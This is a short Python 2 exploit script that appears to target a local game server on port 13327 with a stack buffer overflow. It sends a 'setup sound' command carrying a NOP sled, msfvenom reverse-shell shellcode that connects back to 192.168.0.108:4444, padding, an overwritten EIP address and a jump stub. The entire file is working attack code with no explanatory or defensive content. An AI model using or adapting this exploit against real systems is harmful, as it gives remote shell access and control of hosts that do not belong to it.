#!/usr/bin/python
import socket
host = "127.0.0.1"
nop_sled = "\x90" * 8 # NOP sled

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.108 LPORT=4444 -b "\x00\x20" -f py
shellcode =  b""
shellcode += b"\xd9\xcf\xbe\xce\xba\xbe\xcb\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x31\x75\x17\x03\x75\x17"
shellcode += b"\x83\x23\x46\x5c\x3e\x8a\x6c\x56\x22\xbf\xd1"
shellcode += b"\xca\xcf\x3d\x5f\x0d\xbf\x27\x92\x4e\x53\xfe"
shellcode += b"\x9c\x70\x99\x80\x94\xf7\xd8\xe8\xe6\xa0\x1b"
shellcode += b"\x84\x8e\xb2\x1b\x45\x13\x3a\xfa\xd5\xcd\x6c"
shellcode += b"\xac\x46\xa1\x8e\xc7\x89\x08\x10\x85\x21\xfd"
shellcode += b"\x3e\x59\xd9\x69\x6e\xb2\x7b\x03\xf9\x2f\x29"
shellcode += b"\x80\x70\x4e\x7d\x2d\x4e\x11"

padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
